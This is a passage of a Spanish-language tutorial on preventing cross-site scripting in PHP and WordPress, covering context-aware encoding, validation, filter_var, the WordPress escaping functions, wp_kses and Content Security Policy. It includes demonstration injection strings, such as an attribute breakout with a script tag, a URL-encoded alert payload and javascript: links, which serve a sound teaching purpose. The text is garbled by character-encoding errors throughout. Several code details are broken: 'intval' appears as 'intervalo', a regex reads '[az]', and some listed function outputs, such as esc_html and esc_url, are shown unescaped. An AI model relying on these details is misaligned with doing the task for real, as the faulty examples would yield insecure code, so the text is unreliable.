Luego, cuando generamos cada registro en el libro de visitas, usamos filter_var con el filtro FILTER_SANITIZE_FULL_SPECIAL_CHARS que no elimina las etiquetas, pero las escapa si est√°n presentes. Entonces, en el ejemplo anterior, estamos validando y desinfectando la entrada y escapando en la salida. Esto proporciona mucha protecci√≥n contra un XSS almacenado en el caso de un libro de visitas.

> üí≠ **Una nota adicional sobre el c√≥digo anterior:** probablemente hayas notado algunas otras cosas que podr√≠amos hacer m√°s seguras. Por ejemplo, almacenamos nuestro libro de visitas en un archivo que se encuentra en una carpeta accesible desde la web. Eso significa que el p√∫blico puede leer los datos sin procesar. Esto en s√≠ mismo es indeseable y darle a un atacante acceso de lectura a un archivo que no est√° dise√±ado para el consumo p√∫blico puede introducir m√°s vulnerabilidades. Una forma de solucionar esto es crear un archivo de datos pero darle una extensi√≥n PHP. Luego haga que la primera l√≠nea del archivo contenga lo siguiente:

| 1 | `<?php die("Nothing to see here!"); ?>` |

Cuando escriba en el archivo, aseg√∫rese de que la primera l√≠nea permanezca intacta. Cuando leas el archivo, descarta siempre la primera l√≠nea. Almacene el archivo con una extensi√≥n .php, por ejemplo, data.php. Luego, si un atacante intenta acceder al archivo, el servidor web lo tratar√° como PHP ejecutable y lo cerrar√° inmediatamente.

# M√©todos para prevenir XSS

Recuerde que un ataque XSS es un tipo de inyecci√≥n de c√≥digo: la entrada del usuario se interpreta err√≥neamente como c√≥digo de programa malicioso. Para evitar este tipo de inyecci√≥n de c√≥digo, es necesario un manejo seguro de la entrada. Para un desarrollador web, existen dos formas fundamentalmente diferentes de realizar un manejo seguro de la entrada:

- **Codificaci√≥n**, que escapa de la entrada del usuario para que el navegador la interprete solo como datos, no como c√≥digo.
- **Validaci√≥n**, que filtra la entrada del usuario para que el navegador la interprete como c√≥digo sin comandos maliciosos.

> Si bien estos son m√©todos fundamentalmente diferentes para prevenir XSS, comparten varias caracter√≠sticas comunes que es importante comprender al usar cualquiera de ellos:

- **Contexto:** El manejo seguro de la entrada debe realizarse de manera diferente seg√∫n en qu√© parte de una p√°gina se inserte la entrada del usuario.
- **Entrante y saliente:** El manejo seguro de la entrada se puede realizar cuando su sitio web recibe la entrada (entrante) o justo antes de que su sitio web inserte la entrada en una p√°gina (saliente).
- **Servidor de cliente:** El manejo seguro de la entrada se puede realizar en el lado del cliente o en el lado del servidor, los cuales son necesarios en diferentes circunstancias. Antes de explicar en detalle c√≥mo funcionan la codificaci√≥n y la validaci√≥n, describiremos cada uno de estos puntos.

### Contextos de manejo de entradas

Hay muchos contextos en una p√°gina web donde se pueden insertar las entradas del usuario. Para cada uno de ellos, se deben seguir reglas espec√≠ficas para que la entrada del usuario no pueda salirse de su contexto y ser interpretada como c√≥digo malicioso. A continuaci√≥n se detallan los contextos m√°s comunes:

| Contexto | C√≥digo de ejemplo |
| --- | --- |
| contenido del elemento HTML | <div>userInput</div> |
| valor del atributo HTML | <input value="userInput"> |
| valor de consulta de URL | http://example.com/?parameter=userInputhttp://example.com/?parameter=userInput |
| valor CSS | color: userInput |
| valor de javascript | var name = "userInput"; |

### ¬øPor qu√© el contexto importa?

En todos los contextos descritos, surgir√≠a una vulnerabilidad XSS si la entrada del usuario se insertara antes de codificarse o validarse por primera vez. Luego, un atacante podr√≠a inyectar c√≥digo malicioso simplemente insertando el delimitador de cierre para ese contexto y sigui√©ndolo con el c√≥digo malicioso. Por ejemplo, si en alg√∫n momento un sitio web inserta informaci√≥n del usuario directamente en un atributo HTML, un atacante podr√≠a inyectar un script malicioso comenzando su entrada con una comilla, como se muestra a continuaci√≥n:

| C√≥digo de aplicaci√≥n | <input value="userInput"> |
| --- | --- |
| Cadena maliciosa | "><script>...</script><input value=" |
| C√≥digo resultante | <input value=""><script>...</script><input value=""> |

> üëâ Esto podr√≠a evitarse simplemente eliminando todas las comillas en la entrada del usuario, y todo estar√≠a bien, pero s√≥lo en este contexto. Si la misma entrada se insertara en otro contexto, el delimitador de cierre ser√≠a diferente y la inyecci√≥n ser√≠a posible. Por esta raz√≥n, el manejo seguro de la entrada siempre debe adaptarse al contexto donde se insertar√° la entrada del usuario.

## Manejo de entradas entrantes y salientes

Instintivamente, podr√≠a parecer que XSS se puede prevenir codificando o validando todas las entradas del usuario tan pronto como su sitio web las reciba. De esta manera, cualquier cadena maliciosa ya deber√≠a haber sido neutralizada cada vez que se incluye en una p√°gina, y los scripts que generan HTML no tendr√°n que preocuparse por el manejo seguro de la entrada.

El problema es que, como se describi√≥ anteriormente, la entrada del usuario se puede insertar en varios contextos en una p√°gina. No existe una manera f√°cil de determinar cu√°ndo llega la entrada del usuario y en qu√© contexto se insertar√° finalmente, y la misma entrada del usuario a menudo debe insertarse en contextos diferentes. Por lo tanto, confiar en el manejo de la entrada entrante para evitar XSS es una soluci√≥n muy fr√°gil que ser√° propensa a errores. (La caracter√≠stica obsoleta de "[comillas m√°gicas](http://php.net/manual/en/security.magicquotes.php)" de PHP es un ejemplo de dicha soluci√≥n).

En cambio, el manejo de la entrada saliente deber√≠a ser su principal l√≠nea de defensa contra XSS, porque puede tener en cuenta el contexto espec√≠fico en el que se insertar√° la entrada del usuario. Dicho esto, la validaci√≥n entrante a√∫n se puede utilizar para agregar una capa secundaria de protecci√≥n, como describiremos m√°s adelante.

### D√≥nde realizar un manejo seguro de la entrada

En la mayor√≠a de las aplicaciones web modernas, la entrada del usuario se maneja tanto mediante c√≥digo del lado del servidor como mediante c√≥digo del lado del cliente. Para protegerse contra todos los tipos de XSS, se debe realizar un manejo de entrada seguro tanto en el c√≥digo del lado del servidor como en el c√≥digo del lado del cliente.

- Para protegerse contra XSS tradicional, el manejo seguro de la entrada debe realizarse en el c√≥digo del lado del servidor. Esto se hace utilizando cualquier lenguaje soportado por el servidor.
- Para protegerse contra XSS basado en DOM donde el servidor nunca recibe la cadena maliciosa (como el ataque de identificador de fragmento descrito anteriormente ), se debe realizar un manejo de entrada seguro en el c√≥digo del lado del cliente. Esto se hace usando JavaScript.

Ahora que hemos explicado por qu√© es importante el contexto, por qu√© es importante la distinci√≥n entre el manejo de entradas entrantes y salientes y por qu√© es necesario realizar un manejo seguro de las entradas tanto en el c√≥digo del lado del cliente como en el del lado del servidor, continuaremos explicando c√≥mo funciona el contexto. En realidad, se realizan dos tipos de manejo seguro de entradas (codificaci√≥n y validaci√≥n).

### Codificaci√≥n

La codificaci√≥n es el acto de escapar de la entrada del usuario para que el navegador la interprete s√≥lo como datos, no como c√≥digo. El tipo de codificaci√≥n m√°s reconocible en el desarrollo web es el escape HTML, que convierte caracteres como **<** y **>**en **&lt;**y **&gt;**, respectivamente.

El siguiente pseudoc√≥digo es un ejemplo de c√≥mo la entrada del usuario podr√≠a codificarse utilizando el escape HTML y luego insertarse en una p√°gina mediante un script del lado del servidor:

```python
print "<html>"

print "Latest comment: "

print encodeHtml(userInput)

print "</html>"
```

Si la entrada del usuario fuera la cadena `<script>...</script>`, el HTML resultante ser√≠a el siguiente:

```html
<html>

Latest comment:

&lt;script&gt;...&lt;/script&gt;

</html>
```

> üí° Debido a que se han escapado todos los caracteres con significado especial, el navegador no analizar√° ninguna parte de la entrada del usuario como HTML.

## Codificaci√≥n en c√≥digo del lado del cliente y del lado del servidor

Al realizar la codificaci√≥n en el c√≥digo del lado del cliente, el lenguaje utilizado siempre es JavaScript, que tiene funciones integradas que codifican datos para diferentes contextos.

Tmbi√©n, debes confiar en las funciones disponibles en el lenguaje o marco del lado del servidor. Debido a la gran cantidad de lenguajes y marcos disponibles, este tutorial no cubrir√° los detalles de la codificaci√≥n en ning√∫n lenguaje o marco espec√≠fico del lado del servidor. Sin embargo, estar familiarizado con las funciones de codificaci√≥n utilizadas en el lado del cliente en JavaScript tambi√©n es √∫til al escribir c√≥digo del lado del servidor.

### Codificaci√≥n en el lado del cliente

Al codificar la entrada del usuario en el lado del cliente usando JavaScript, existen varios m√©todos y propiedades integrados que codifican autom√°ticamente todos los datos seg√∫n el contexto:

| Contexto | M√©todo/propiedad |
| --- | --- |
| contenido del elemento HTML | node.textContent = userInput |
| valor del atributo HTML | element.setAttribute(attribute, userInput)
o
element[attribute] = userInput |
| valor de consulta de URL | window.encodeURIComponent(userInput) |
| valor CSS | element.style.property = userInput |

> üí° El √∫ltimo contexto mencionado anteriormente (valores de JavaScript) no est√° incluido en esta lista, porque JavaScript no proporciona una forma integrada de codificar los datos que se incluir√°n en el c√≥digo fuente de JavaScript.

## Limitaciones de la codificaci√≥n

Incluso con codificaci√≥n, ser√° posible introducir cadenas maliciosas en algunos contextos. Un ejemplo notable de esto es cuando se utiliza la entrada del usuario para proporcionar URL, como en el siguiente ejemplo:

```javascript
document.querySelector('a').href = userInput;
```

Aunque asignar un valor a la hrefpropiedad de un elemento ancla lo codifica autom√°ticamente para que se convierta en nada m√°s que un valor de atributo, esto en s√≠ mismo no impide que el atacante inserte una URL que comience con " javascript:". Cuando se hace clic en el enlace, se ejecutar√° cualquier JavaScript incrustado dentro de la URL.

La codificaci√≥n tambi√©n es una soluci√≥n inadecuada cuando realmente se desea que el usuario defina parte del c√≥digo de una p√°gina. Un ejemplo es una p√°gina de perfil de usuario donde el usuario puede definir HTML personalizado. Si este HTML personalizado estuviera codificado, la p√°gina de perfil podr√≠a consistir √∫nicamente en texto sin formato.

En situaciones como estas, la codificaci√≥n debe complementarse con la validaci√≥n, que describiremos a continuaci√≥n.

### Validaci√≥n

La validaci√≥n es el acto de filtrar la entrada del usuario para que se eliminen todas las partes maliciosas, sin necesariamente eliminar todo el c√≥digo que contiene. Uno de los tipos de validaci√≥n m√°s reconocibles en el desarrollo web es permitir algunos elementos HTML (como `<em>` y `<strong>`) pero no permitir otros (como `<script>`).

Hay dos caracter√≠sticas principales de validaci√≥n que difieren entre implementaciones:

1. **Estrategia de clasificaci√≥n**: La entrada del usuario se puede clasificar mediante listas negras o listas blancas.

2. **Resultado de la validaci√≥n**: Las entradas del usuario identificadas como maliciosas pueden rechazarse o desinfectarse.

### Funciones para validar tus datos

La validaci√≥n en programaci√≥n es cuando verifica que los datos que su aplicaci√≥n ha recibido se encuentran dentro de las restricciones que usted define para garantizar que no contengan nada irrazonable, innecesario o malicioso. **La validaci√≥n no reemplaza la desinfecci√≥n o el escape** , porque como veremos (en la secci√≥n que analiza `filter_var()` a continuaci√≥n), los datos maliciosos pueden pasar algunas funciones de validaci√≥n.

Las restricciones que utilizar√° var√≠an, pero con frecuencia son similares a las restricciones utilizadas en un lenguaje estrictamente tipificado. Por ejemplo, podr√≠a utilizar algunas de las siguientes comprobaciones:

- ¬øSon los datos un n√∫mero entero? (solo de 0 a 9 d√≠gitos)
- ¬øLos datos son flotantes y se permite un punto decimal? (0 a 9 y . car√°cter).
- Son n√∫meros de datos y guiones, por ejemplo, un campo de fecha de tarjeta de cr√©dito.
- ¬øLos datos son una cadena con n√∫meros, letras, espacios y puntuaci√≥n √∫nicamente?
- ¬øLos datos son una de un n√∫mero limitado de opciones que se pueden seleccionar, por ejemplo, 'opci√≥n1', 'opci√≥n2', 'opci√≥n3'?

Durante la validaci√≥n, si rechaza datos, a menudo devolver√° un error al usuario describiendo el problema y solicit√°ndole los datos correctos.

A continuaci√≥n, hemos incluido funciones que los desarrolladores de PHP utilizan con frecuencia para comprobar si los datos recibidos por una aplicaci√≥n son v√°lidos (para validar datos). Por lo general, se usan en una declaraci√≥n if() para verificar si los datos son v√°lidos y, de lo contrario, la aplicaci√≥n devuelve un error al usuario.

| Funci√≥n | Qu√© hace | Ejemplo |
| --- | --- | --- |
| `is_numeric()` | Verifica si los datos consisten en d√≠gitos del 0 al 9 con signo opcional y punto decimal opcional. | `is_numeric($input)` devuelve verdadero si `$input == '-9.123'` |
| `preg_match()` | Verifica si los datos coinciden con una expresi√≥n regular. | `preg_match('/^[az]{2,3}$/', $input)` devuelve verdadero si `$input` tiene letras min√∫sculas de 2 o 3 caracteres. Nota el `^` y `$` en la expresi√≥n regular. |
| `filter_var()` | Verifica si los datos se ajustan a un filtro incorporado de PHP. | `filter_var($input, FILTER_VALIDATE_EMAIL)` verifica si `$input` es una direcci√≥n de correo electr√≥nico v√°lida. Otros filtros √∫tiles incluyen `FILTER_VALIDATE_IP`, `FILTER_VALIDATE_URL`, `FILTER_VALIDATE_BOOLEAN`. http://php.net/manual/en/filter.filters.validate.php |
| `in_array()` | Verifica si los datos pertenecen a un rango de valores permitidos. | `in_array($input, array('Windows', 'Linux', 'OSX', 'Other'))` devuelve verdadero si `$input` contiene uno de los valores permitidos. Ideal para campos `<select>` y botones de opci√≥n en formularios web. |

### C√≥mo utilizar de forma segura expresiones regulares para la validaci√≥n

Cuando use expresiones regulares con `preg_match()` para validar datos, aseg√∫rese de hacer coincidir toda la cadena usando un car√°cter de intercalaci√≥n ^ al comienzo de su expresi√≥n regular y un signo de d√≥lar $ al final. Estos coinciden con el inicio y el final de una cadena y garantizar√°n que no solo est√© validando algo en medio de la entrada, sino que est√© validando toda la cadena. Omitirlos crea un grave problema de seguridad porque un atacante puede incluir algunos datos v√°lidos que pasar√°n la prueba, pero anteponer o agregar cualquier cosa maliciosa que desee.

**El uso de `filter_var()` para la validaci√≥n no reemplaza la desinfecci√≥n o el escape.**

En general, la funci√≥n `filter_var()` se utiliza de la siguiente manera para validar los datos a medida que llegan a su aplicaci√≥n:

| Ejemplo | C√≥digo |
| --- | --- |
| 1<br>2<br>3 | ```php<br>if ($test = filter_var('test@example.com', FILTER_VALIDATE_EMAIL)) {<br>    echo "Received: $test\n";<br>}<br>``` |

Si reemplaza el correo electr√≥nico anterior con 'test@example.com<script>' ver√° que la verificaci√≥n falla y la declaraci√≥n de eco no se ejecuta.

Considere el siguiente ejemplo que demuestra c√≥mo los datos maliciosos pueden pasar un paso de validaci√≥n. Esto muestra c√≥mo la validaci√≥n no sustituye a la desinfecci√≥n y el escape en la salida.

| Ejemplo | C√≥digo |
| --- | --- |
| 1<br>2<br>3 | ```php<br>if ($test = filter_var('http://example.com/?%22%3e%3cscript%3ealert(%22XSS%22)%3c/script%3e%3ca%22%27', FILTER_VALIDATE_URL)) {<br>    echo "Received: $test\n";<br>}<br>``` |

El ejemplo anterior generar√° lo siguiente:

| 1 | Received: http://example.com/?%22%3e%3cscript%3ealert(%22XSS%22)%3c/script%3e%3ca" |

Esto crea una vulnerabilidad XSS si esta salida no est√° desinfectada ni escapada. Cambiar el c√≥digo de la siguiente manera eliminar√° la vulnerabilidad XSS:

| Ejemplo | C√≥digo |
| --- | --- |
| 1<br>2<br>3 | ```php<br>if ($test = filter_var('http://example.com/?%22%3e%3cscript%3ealert(%22XSS%22)%3c/script%3e%3ca%22%27', FILTER_VALIDATE_URL)) {<br>    echo "Received: " . esc_url($test) . "\n";<br>}<br>``` |

El c√≥digo anterior generar√° lo siguiente, que es seguro:

| 1 | Received: http://example.com/?scriptalert(XSS)/scripta |

Consulte a continuaci√≥n para obtener m√°s informaci√≥n sobre las funciones que puede utilizar para escapar y desinfectar.

### Funciones para escapar y desinfectar sus datos

Cuando est√© listo para enviar datos al navegador web de un visitante, un archivo, una red o alg√∫n otro lugar donde los datos salgan de su aplicaci√≥n, deber√° asegurarse de que los datos que est√° enviando est√©n seguros. PHP y WordPress proporcionan una variedad de funciones que escapan y/o desinfectan sus datos. Es importante tener en cuenta que estas funciones cambiar√°n sus datos si es necesario para que est√©n seguros.

### Funciones integradas de desinfecci√≥n y escape de PHP

Las siguientes funciones est√°n integradas en PHP y puede usarlas ya sea que est√© ejecutando su aplicaci√≥n dentro del entorno de WordPress o no. Notar√°s que proporcionamos varios ejemplos de `filter_var()`. Este es el nuevo est√°ndar en la desinfecci√≥n de PHP y se incluye de forma predeterminada con PHP desde la versi√≥n 5.2 de PHP. Recomendamos usar `filter_var()` en lugar de funciones PHP m√°s antiguas.

| Funci√≥n | Producci√≥n | Descripci√≥n |
| --- | --- | --- |
| intervalo('123AA456') | 123 | Desinfectar n√∫meros enteros. [ http://php.net/manual/en/function.intval.php ] |
| filter_var('marca<script>@ejemplo.com', FILTER_SANITIZE_EMAIL) | markscript@ejemplo.com | Desinfectar los correos electr√≥nicos. [ http://php.net/manual/en/filter.filters.sanitize.php ] |
| filter_var('Probando <etiquetas> y caracteres.', FILTER_SANITIZE_SPECIAL_CHARS) | Probando <etiquetas> & caracteres. | Codifica caracteres especiales. [ http://php.net/manual/en/filter.filters.sanitize.php ] |
| filter_var('Eliminar <etiqueta> y codificar.', FILTER_SANITIZE_STRING); | Pele y codifique. | Eliminar etiquetas. [ http://php.net/manual/en/filter.filters.sanitize.php ] |
| filter_var('Eliminar <etiqueta> y codificar.', FILTER_SANITIZE_STRING, FILTER_FLAG_ENCODE_LOW | FILTER_FLAG_ENCODE_HIGH | FILTER_FLAG_ENCODE_AMP)
 | Tira & codificar. | Elimine etiquetas con indicadores de codificaci√≥n adicionales. [ http://php.net/manual/en/filter.filters.sanitize.php ] |

**Veamos algunos casos con WordPress**

## Funciones de desinfecci√≥n de la API de WordPress

WordPress incluye una variedad de funciones de desinfecci√≥n dise√±adas para casos de uso espec√≠ficos. Hemos incluido usos de ejemplo a continuaci√≥n que le dan una idea de c√≥mo estas funciones cambian los datos.

| Funci√≥n | Salida | Descripci√≥n |
| --- | --- | --- |
| `absint('-123ABC')` | `123` | Sanitiza a enteros positivos. [Leer m√°s](https://codex.wordpress.org/Function_Reference/absint) |
| `sanitize_email("!#$%^&&*()__+=-{}||[:\"';<>?/.,test@example.com")` | `!#$%^&**__+=-{}|'?/.test@example.com` | Sanitiza direcciones de correo electr√≥nico. [Leer m√°s](https://codex.wordpress.org/Function_Reference/sanitize_email) |
| `sanitize_file_name('.-_/path/to/file-name.txt');` | `path/to/file-name.txt` | Sanitiza nombres de archivos. [Leer m√°s](https://codex.wordpress.org/Function_Reference/sanitize_file_name) |
| `sanitize_html_class('class!@#$%^&*()-name_here.');` | `class-name_here` | Sanitiza nombres de clases CSS. [Leer m√°s](https://codex.wordpress.org/Function_Reference/sanitize_html_class) |
| `sanitize_key('KeyName!@#$%^&*()<>,.?/');` | `keyName` | Sanitiza claves para arreglos asociativos. [Leer m√°s](https://codex.wordpress.org/Function_Reference/sanitize_key) |
| `sanitize_mime_type('text/plain-blah!@#$%^&*()}{[]":;><,.?/');` | `text/plain-blah*./` | Sanitiza tipos MIME. [Leer m√°s](https://codex.wordpress.org/Function_Reference/sanitize_mime_type) |
| `sanitize_option('thumbnail_size_h', '123ABC-_');` | `123` | WP sanitiza opciones. El tipo de filtrado depende del nombre de la opci√≥n. [Leer m√°s](https://codex.wordpress.org/Function_Reference/sanitize_option) |
| `sanitize_sql_orderby('colName');` | `colName` | Sanitiza un nombre de columna usado en SQL 'ORDER BY'. Devuelve en blanco si se encuentran caracteres inv√°lidos. [Leer m√°s](https://codex.wordpress.org/Function_Reference/sanitize_sql_orderby) |
| `sanitize_text_field('<tag>some text</tag>')` | `some text` | Verifica UTF-8 inv√°lido, convierte `<` a entidad, elimina todas las etiquetas, saltos de l√≠nea extra, tabulaciones y espacios en blanco. [Leer m√°s](https://codex.wordpress.org/Function_Reference/sanitize_text_field) |
| `sanitize_title('<tag><?php //bla ?>Title here');` | `title-here` | Convierte el texto a un t√≠tulo estilo slug para usar en una URL. [Leer m√°s](https://codex.wordpress.org/Function_Reference/sanitize_title) |
| `sanitize_user('<label>123ABCdef _.-*@name!#$', true);` | `123ABCdef _.-@name` | Sanitiza nombres de usuario de WP. El segundo par√°metro permite una sanitizaci√≥n estricta. [Leer m√°s](https://codex.wordpress.org/Function_Reference/sanitize_user) |

### Funciones de escape de la API de WordPress

WordPress tambi√©n incluye funciones de escape para uso general. Hemos incluido las funciones principales a continuaci√≥n con ejemplos de entrada y salida para ilustrar su uso.

| Funci√≥n | Salida | Comentarios |
| --- | --- | --- |
| `esc_html('<tag> & text');` | `<tag> &amp; text` | Escapa HTML para una salida segura en el navegador. [Leer m√°s](https://codex.wordpress.org/Function_Reference/esc_html) |
| `esc_url('http://example.com/<script>alert("TEST");</script>');` | `http://example.com/`<script>alert("TEST");</script>` | Escapa URLs para que sean seguras para salida como texto o atributos HTML. [Leer m√°s](https://codex.wordpress.org/Function_Reference/esc_url) |
| `esc_js('alert("1");');` | `alert("1");` | Escapa JavaScript para un uso seguro en HTML en l√≠nea, por ejemplo, en un manejador `onclick`. [Leer m√°s](https://codex.wordpress.org/Function_Reference/esc_js) |
| `esc_attr('attr-<>&\'"name');` | `attr-<>&\'"name` | Se usa para escapar atributos HTML, por ejemplo, `alt`, `title`, `value`, etc. [Leer m√°s](https://codex.wordpress.org/Function_Reference/esc_attr) |
| `esc_textarea('Text <tag> & text');` | `Text <tag> &amp; text` | Escapa texto para salida en el elemento `<textarea>`. [Leer m√°s](https://codex.wordpress.org/Function_Reference/esc_textarea) |

### La funci√≥n `wp_kses()`

wp_kses [()](https://codex.wordpress.org/Function_Reference/wp_kses) es una funci√≥n de desinfecci√≥n m√°s compleja. Elimina los guiones malvados. De ah√≠ viene el nombre: ‚Äúkses quita guiones malvados‚Äù. Cuando use wp_kses() necesitar√° incluir una serie de etiquetas y los atributos permitidos para cada etiqueta como segundo par√°metro de kses. He aqu√≠ un ejemplo:

| N√∫mero de l√≠nea | C√≥digo |
| --- | --- |
| 1 | `$allowed = array(` |
| 2 | `   'a' => array( 'href' => array(), 'title' => array() ),` |
| 3 | `   'br' => array(),` |
| 4 | `   'em' => array(),` |
| 5 | `   'strong' => array(),` |
| 6 | `);` |
| 7 | `echo wp_kses($output, $allowed);` |

Lo anterior permitir√° la etiqueta 'A' con los atributos 'href' y 'title'. Tambi√©n permitir√° las siguientes etiquetas sin atributos: br, em y strong. Si se incluyen atributos con esas etiquetas, se eliminar√°n.

`wp_kses()` consume mucho procesador porque el c√≥digo es complejo. Entonces, en general, le recomendamos que primero intente usar las funciones PHP integradas porque son m√°s r√°pidas, luego las funciones m√°s simples de limpieza y escape de WordPress, y luego solo use `wp_kses()` si es necesario. Eso le brindar√° el mejor rendimiento para su complemento o tema.

En Worpress es importante que tomes medidas para solucionar el problema. Aqu√≠ hay algunos pasos que puedes seguir:

- Actualiza WordPress y los plugins a la √∫ltima versi√≥n: Asegurate de que WordPress y los plugins que est√°s usando est√©n actualizados a la √∫ltima versi√≥n. Los desarrolladores a menudo lanzan actualizaciones de seguridad para abordar las vulnerabilidades conocidas, incluyendo las vulnerabilidades de XSS.
- Realiza un an√°lisis de seguridad: Realiza un an√°lisis de seguridad completo en tu sitio para identificar cualquier otra vulnerabilidad que pueda estar presente. Hay varias herramientas de an√°lisis de seguridad disponibles en l√≠nea que pueden ayudarte a escanear tu sitio en busca de vulnerabilidades.
- Elimina el c√≥digo malicioso: Si encuentras c√≥digo malicioso en tu sitio, elim√≠nalo inmediatamente. A menudo, el c√≥digo malicioso de XSS se puede encontrar en los archivos PHP o JavaScript de tu sitio. Asegurate de que elimines todo el c√≥digo malicioso y revisa todos los archivos para estar seguro.
- Restablece todas las contrase√±as: Cambia todas las contrase√±as de tu sitio, incluyendo la contrase√±a de administrador, y asegurate de que sean fuertes y √∫nicas.
- Configura las pol√≠ticas de seguridad adecuadas: Configura adecuadamente las pol√≠ticas de seguridad de tu sitio para evitar que los atacantes exploten vulnerabilidades de XSS. Por ejemplo, puedes configurar las directivas de seguridad de contenido para evitar que se carguen scripts maliciosos.
- Utiliza plugins de seguridad: Utiliza plugins de seguridad de WordPress de buena reputaci√≥n para proteger tu sitio contra futuros ataques de XSS. Estos plugins pueden ayudarte a detectar y prevenir vulnerabilidades de seguridad, como la inyecci√≥n de scripts maliciosos.

> üí° Es importante tomar medidas r√°pidas para solucionar una vulnerabilidad de XSS en tu sitio WordPress, ya que los atacantes pueden utilizar estas vulnerabilidades para tomar el control de tu sitio y robar datos sensibles.

### Estrategia de clasificaci√≥n

- **Lista negra**

Instintivamente, parece razonable realizar la validaci√≥n definiendo un patr√≥n prohibido que no deber√≠a aparecer en la entrada del usuario. Si una cadena coincide con este patr√≥n, se marca como no v√°lida. Un ejemplo ser√≠a permitir a los usuarios enviar URL personalizadas con cualquier protocolo excepto javascript:. Esta estrategia de clasificaci√≥n se llama *lista negra* .

Sin embargo, la inclusi√≥n en listas negras tiene dos inconvenientes importantes:

- **Complejidad**

Describir con precisi√≥n el conjunto de todas las posibles cadenas maliciosas suele ser una tarea muy compleja. La pol√≠tica de ejemplo descrita anteriormente no se pudo implementar exitosamente simplemente buscando la subcadena " javascript", porque esto perder√≠a cadenas del formato " Javascript:" (donde la primera letra est√° en may√∫scula) y " &#106;avascript:" (donde la primera letra est√° codificada como un n√∫mero referencia de personaje).

- **Estancamiento**

Incluso si se desarrollara una lista negra perfecta, fracasar√≠a si se a√±adiera al navegador una nueva caracter√≠stica que permitiera el uso malicioso. Por ejemplo, una lista negra de validaci√≥n de HTML desarrollada antes de la introducci√≥n del onmousewheelatributo HTML5 no lograr√≠a impedir que un atacante utilice ese atributo para realizar un ataque XSS. Este inconveniente es especialmente significativo en el desarrollo web, que se compone de muchas tecnolog√≠as diferentes que se actualizan constantemente.

Debido a estos inconvenientes, se desaconseja encarecidamente la inclusi√≥n en listas negras como estrategia de clasificaci√≥n. La inclusi√≥n en listas blancas suele ser un enfoque mucho m√°s seguro, como describiremos a continuaci√≥n.

- **Lista blanca**

*La creaci√≥n de listas blancas* es esencialmente lo opuesto a las listas negras: en lugar de definir un patr√≥n prohibido, un enfoque de lista blanca define un patr√≥n permitido y marca la entrada como no v√°lida si no *coincide* con este patr√≥n.

A diferencia del ejemplo anterior de lista negra, un ejemplo de lista blanca ser√≠a permitir a los usuarios enviar URL personalizadas que contengan solo los protocolos http:y https:nada m√°s. Este enfoque marcar√≠a autom√°ticamente una URL como no v√°lida si tuviera el protocolo javascript:, incluso si apareciera como " Javascript:" o " &#106;javascript:".

En comparaci√≥n con las listas negras, las listas blancas tienen dos ventajas principales:

1. **Sencillez**: Describir con precisi√≥n un conjunto de cadenas seguras suele ser mucho m√°s f√°cil que identificar el conjunto de todas las cadenas maliciosas. Esto es especialmente cierto en situaciones comunes en las que la entrada del usuario s√≥lo necesita incluir un subconjunto muy limitado de la funcionalidad disponible en un navegador. Por ejemplo, la lista blanca descrita anteriormente que permite solo URL con los protocolos http:o https:es muy simple y perfectamente adecuada para los usuarios en la mayor√≠a de situaciones.
2. **Longevidad:** A diferencia de una lista negra, una lista blanca generalmente no quedar√° obsoleta cuando se agregue una nueva funci√≥n al navegador. Por ejemplo, una lista blanca de validaci√≥n de HTML que permita solo el titleatributo en elementos HTML seguir√≠a siendo segura incluso si se desarrollara antes de la introducci√≥n del onmousewheelatributo HTML5.

## Resultado de la validaci√≥n

Cuando la entrada se ha marcado como no v√°lida, se puede realizar una de dos acciones:

> Rechazo: La entrada simplemente se rechaza, lo que impide que se utilice en otras partes del sitio web.

> Higienizaci√≥n: Todas las partes no v√°lidas de la entrada se eliminan y el sitio web utiliza normalmente la entrada restante.

De estos dos, el rechazo es el enfoque m√°s sencillo de implementar. Dicho esto, la desinfecci√≥n puede ser m√°s √∫til ya que permite una gama m√°s amplia de aportaciones por parte del usuario. Por ejemplo, si un usuario env√≠a un n√∫mero de tarjeta de cr√©dito, una rutina de desinfecci√≥n que elimine todos los caracteres que no sean d√≠gitos evitar√≠a la inyecci√≥n de c√≥digo y permitir√≠a al usuario ingresar el n√∫mero con o sin guiones.

Si decide implementar una desinfecci√≥n, debe asegurarse de que la rutina de desinfecci√≥n en s√≠ no utilice un enfoque de lista negra . Por ejemplo, la URL " Javascript:...", incluso cuando se identifica como no v√°lida mediante un enfoque de lista blanca, superar√≠a una rutina de desinfecci√≥n que simplemente elimina todas las instancias de " javascript:". Por este motivo, siempre que sea posible, se deben utilizar bibliotecas y marcos bien probados para la desinfecci√≥n.

### ¬øQu√© t√©cnica de prevenci√≥n utilizar?

La codificaci√≥n debe ser su primera l√≠nea de defensa contra XSS, porque su prop√≥sito es neutralizar los datos para que no puedan interpretarse como c√≥digo. En algunos casos, la codificaci√≥n debe complementarse con validaci√≥n, como se explic√≥ anteriormente. Esta codificaci√≥n y validaci√≥n deben ser salientes, porque solo cuando la entrada se incluye en una p√°gina se sabe para qu√© contexto codificar y validar.

Como segunda l√≠nea de defensa, debe utilizar la validaci√≥n entrante para desinfectar o rechazar datos que son claramente inv√°lidos, como los enlaces que utilizan el javascript:protocolo. Si bien esto por s√≠ solo no puede proporcionar seguridad total, es una precauci√≥n √∫til si en alg√∫n momento la codificaci√≥n y validaci√≥n saliente se realiza incorrectamente debido a errores o equivocaciones.

> üëâ Si estas dos l√≠neas de defensa se utilizan de forma coherente, su sitio web estar√° protegido de ataques XSS. Sin embargo, debido a la complejidad de crear y mantener un sitio web completo, puede resultar dif√≠cil lograr una protecci√≥n total utilizando √∫nicamente un manejo seguro de la entrada. Como tercera l√≠nea de defensa, tambi√©n debes hacer uso de la Pol√≠tica de seguridad de contenido (CSP), que describiremos a continuaci√≥n.

### Pol√≠tica de seguridad de contenido (CSP)

La desventaja de protegerse contra XSS utilizando √∫nicamente un manejo de entrada seguro es que incluso una sola falla de seguridad puede comprometer su sitio web. Un est√°ndar web reciente llamado Pol√≠tica de seguridad de contenido (CSP) puede mitigar este riesgo.

CSP se utiliza para restringir el navegador que ve su p√°gina para que solo pueda usar recursos descargados de fuentes confiables. Un *recurso* es un script, una hoja de estilo, una imagen o alg√∫n otro tipo de archivo al que hace referencia la p√°gina. Esto significa que incluso si un atacante logra inyectar contenido malicioso en su sitio web, CSP puede impedir que se ejecute.

CSP se puede utilizar para hacer cumplir las siguientes reglas:

- **Sin fuentes no confiables**: Los recursos externos s√≥lo se pueden cargar desde un conjunto de fuentes confiables claramente definidas.

- **Sin recursos en l√≠nea:** JavaScript y CSS en l√≠nea no se evaluar√°n.

